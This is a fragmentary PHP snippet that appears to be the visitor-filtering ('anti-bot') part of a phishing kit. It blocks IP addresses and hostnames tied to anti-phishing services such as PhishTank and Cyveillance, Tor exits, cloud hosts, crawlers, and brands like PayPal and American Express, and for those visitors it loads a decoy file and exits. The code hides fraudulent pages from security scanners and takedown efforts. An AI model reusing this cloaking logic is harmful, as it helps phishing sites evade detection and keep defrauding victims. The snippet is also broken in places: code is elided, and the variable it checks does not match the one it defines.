...
$blocked_words = array("above","level3","level","involta","SOLUTIONPRO-NET","SOLUTION","SolutionPro","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal","bot",
     "above",
     "google",
     "docomo",
     "mediapartners",
...
if(in_array($_SERVER['REMOTE_ADDR'],$Bot)) {
    ...
    exit;
     ...
     foreach($Bot as $bot) {
          if(preg_match('/' . $bot . '/',$_SERVER['REMOTE_ADDR'])){
               @require_once $_SERVER['DOCUMENT_ROOT']."/_pros.php";
    exit;
          }
     }
